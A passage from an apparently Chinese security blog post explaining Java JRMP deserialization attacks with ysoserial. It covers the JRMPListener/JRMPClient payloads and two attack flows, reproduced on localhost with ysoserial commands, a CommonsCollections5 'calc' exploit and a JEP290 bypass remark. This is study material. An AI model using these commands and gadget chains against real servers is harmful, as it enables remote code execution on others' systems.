+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">UnicastRef</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnicastRef</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">LiveRef</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">te</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">));</span></span></span></code></pre></div></div><p>因为创建 <code>UnicastRef</code> 对象需要 <code>LiveRef</code> 对象，而 LiveRef 对象里的参数有需要 <code>TCPEndpoint</code> 对象。</p>
+<p>然后创建 <code>UnicastRef</code> 的动态代理。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">RemoteObjectInvocationHandler</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RemoteObjectInvocationHandler</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Registry</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Registry</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">JRMPClient</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Registry</span><span class="p">.</span><span class="na">class</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">},</span><span class="w"> </span><span class="n">obj</span><span class="p">);</span></span></span></code></pre></div></div><p>这个类的关键代码就是这些了。这个 payload 的主要作用是序列化后触发 DGC 通信然后进行反向连接。接受到服务端的 exp 再次进行反序列化从而执行恶意代码。</p>
+<h4 id="exploitjrmplistener">exploit/JRMPListener</h4>
+<p>exploit/JRMPListener 开启监听，客户端向 exploit/JRMPListener 进行连接时，会返回给客户端一个序列化对象，服务器接收一个对象后会进行反序列化操作</p>
+<p>这个恶意对象就是这里 payloadObject</p>
+<p>有什么办法让客户端主动向 exploit/JRMPListener 进行连接？</p>
+<p>那就要用到 payload/JRMPClient，<strong>UnicastRef 对象封装了 host、port 等信息，反序列化 UnicastRef 对象后，会触发 DGC 通信，与指定 host 的指定 port 进行连接</strong></p>
+<p>导致恶意服务端传输恶意数据流，在客户端造成反序列化</p>
+<h3 id="关于-jrmp-的两种攻击流程如下">关于 JRMP 的两种攻击流程如下</h3>
+<h4 id="第一种攻击方式">第一种攻击方式</h4>
+<p>个人理解：基于 RMI 的反序列化中的客户端打服务端的类型</p>
+<p>我们需要先发送指定的 payload（JRMPListener）到存在漏洞的服务器中，使得该服务器反序列化完成我们的 payload 后会开启一个 RMI 的服务监听在设置的端口上。</p>
+<p>我们还需要在我们自己的服务器使用 exploit（JRMPClient）与存在漏洞的服务器进行通信，并且发送一个利用链，达到一个命令执行的效果。</p>
+<p>简单来说就是将一个 payload（JRMPListener）发送到存在漏洞的服务器，存在漏洞的服务器反序列化操作该 payload（JRMPListener）过后会在指定的端口开启 RMI 监听，然后再通过 exploit（JRMPClient） 去发送利用链载荷，最终在存在漏洞的服务器上进行反序列化操作。</p>
+<h4 id="第二种攻击方式">第二种攻击方式</h4>
+<p>个人理解：基于 RMI 的反序列化中的服务端打客户端的类型，这种攻击方式在实战中比较常用</p>
+<p>将 exploit（JRMPListener）作为攻击方进行监听。</p>
+<p>我们发送指定的 payloads（JRMPClient）使得存在漏洞的服务器向我们的 exploit（JRMPListener）进行连接，连接后 exploit（JRMPListener）则会返回给存在漏洞的服务器序列化的对象，而存在漏洞的服务器接收到了则进行反序列化操作，从而进行命令执行的操作。</p>
+<p>PS：这里的 payload 和 exploit 就是指的不同包下的 JRMPListener 和 JRMPClient！</p>
+<h3 id="第一种攻击方式客户端攻击服务端">第一种攻击方式（客户端攻击服务端）</h3>
+<p><strong>payloads.JRMPListener+exploit.JRMPClient</strong></p>
+<p>看到上面 yso 中的四个类分析，可以先利用 <code>payloads.JRMPListener</code> 让客户端开启监听端口，在 yso 的运行下，这个对象将会被序列化处理，然后被进行传输，那么既然被序列化了，那么肯定是需要被触发的。</p>
+<p>先通过yso来进行生成这个序列化对象：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener <span class="m">1099</span> &gt; payload1.txt</span></span></code></pre></div></div><p>也可以进行base64编码，<code>-w 0</code>表示编码不换行</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="n">jar</span> <span class="n">JRMPListener</span> <span class="mi">1099</span><span class="o">|</span><span class="n">base64</span> <span class="o">-</span><span class="n">w</span> <span class="mi">0</span> <span class="o">&gt;</span> <span class="n">payload1</span><span class="o">.</span><span class="n">txt</span></span></span></code></pre></div></div><p>然后创建个可以进行反序列化的服务器来继续测试（<font color=pink>需要存在反序列化漏洞？</font>）</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jrmptest</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">deserialize</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">os</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;jrmplistener_payload.txt&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">os</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">os</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">deserialize</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;D:\\yingwenmingthree\\ysoserial-master\\target\\payload1.txt&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">is</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><p>运行</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205600498.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205600498.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205600498.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205600498.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205600498.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205600498.png" /></p>
+<p>虽然这里没有什么显示，但是去查看端口发现 1099 端口已经开始监听了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205702305.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205702305.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205702305.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205702305.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205702305.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903205702305.png" /></p>
+<p>说明已经成功反序列化了我们的 payload1.txt，</p>
+<p>具体RMI服务端和注册端如何绑定远程对象的详细过程参考：<a href="https://www.cnblogs.com/zpchcbd/p/13517074.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/zpchcbd/p/13517074.html</a></p>
+<p>当前面的 <code>payloads/JRMPListener</code> 作用了之后，那么对方就已经开启了 RMI 服务，接下来我们就可以通过 <code>exploit/JRMPClient</code> 发送 <code>gadgets</code> 来进行利用了（前提对方存在可以利用的 gadgets）</p>
+<p><strong>该方法中的两个注解：</strong></p>
+<p>一、其功能和 <code>RMIRegistryExpoit</code> 类似，但是 <code>RMIRegistryExpoit</code> 主要目标是 rmi 的 Registry 模块，而 JRMPClient 攻击的目标是的 rmi 中的 DGC 模块（Distributed Garbage Collection），只要有 RMI 服务监听了，都会有 DGC 的存在！</p>
+<p>二、因为它Client全都是向server发送数据，没有接受过任何来自server端的数据。在 exploit/JRMPListener 和 payloads/JRMPClient 的利用过程中，这个 server 端和 client 端，攻击者和受害者的角色是可以互换的，在你去打别人的过程中，很有可能被反手一下，所以最好的情况就是，只是发送数据，不去接受另一端传过来的信息，所以说用这个 <code>exploit/JRMPClient</code> 是不会自己打自己的)</p>
+<p>先来看下yso的 <code>exploit/JRMPClient</code> 的攻击复现，这里接着上面反序列化了 payload/JRMPListener 模块，开启了一个 1099 端口</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 calc</span></span></code></pre></div></div><p>直接就攻击成功了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903210857972.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903210857972.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903210857972.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903210857972.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903210857972.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903210857972.png" /></p>
+<p>其调用栈</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903211453842.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903211453842.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903211453842.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903211453842.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903211453842.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903211453842.png" /></p>
+<p>其实该 payload 最主要的就是利用的 DGCImpI_Skel 的 dispatch 方法中的分支的反序列化进行攻击。剩下的我感觉其实就是 RMI 服务端接收来自客户端的数据的一些处理。</p>
+<h3 id="第二种攻击方式服务端攻击客户端">第二种攻击方式（服务端攻击客户端）</h3>
+<p><strong>exploit.JRMPListener+payloads.JRMPClient</strong></p>
+<p>这个服务端打客户端的类型比起客户端打服务端的类型会更加的常用，一方面是外连，另一方面更多的因为是该 <code>exploit/JRMPListener+payloads/JRMPClient</code> 还存在绕过 <code>JEP290</code> 的限制，所以往往会更加的通用。</p>
+<p>参考 <a href="https://gaorenyusi.github.io/posts/jep290/" target="_blank" rel="noopener noreffer ">Java JEP290</a></p>
+<p><code>payloads.JRMPClient</code>：携带指定的攻击机 ip 和端口生成受害机第一次反序列化（<font color=pink>需要代码中存在一个反序列化点</font>）时的 payload，受害机反序列化该 payload 时会向指定的攻击机 ip+端口发起 RMI 通信，在通信阶段攻击机会将第二次反序列化的 payload（如 CommonCollections1）发送给受害机，此时发生第二次反序列化，执行真正的恶意命令。</p>
+<p>找到一个反序列化点，然后将其 <code>payloads/JRMPClient</code> 发送，自己本地开启一个 <code>exploit/JRMPListener</code> 监听，最后就能成功，</p>
+<p><font color=red>既然有反序列化点为什么不直接打 cc 链了，是为了绕过 JEP290 或者其他什么过滤之类的？</font></p>
+<p>参考：<a href="https://www.cnblogs.com/zpchcbd/p/14934168.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/zpchcbd/p/14934168.html</a></p>
+<p>参考：<a href="https://xz.aliyun.com/t/12780" target="_blank" rel="noopener noreffer ">https://xz.aliyun.com/t/12780</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-07-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/jrmp/" data-title="Java JRMP 反序化" data-hashtags="java,反序列化"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/jrmp/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a>,&nbsp;<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/rm2/" class="prev" rel="prev" title="java RMI反序列化-攻击篇"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>java RMI反序列化-攻击篇</a>
+            <a href="/posts/jep290/" class="next" rel="next" title="Java JEP290">Java JEP290<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+</html>
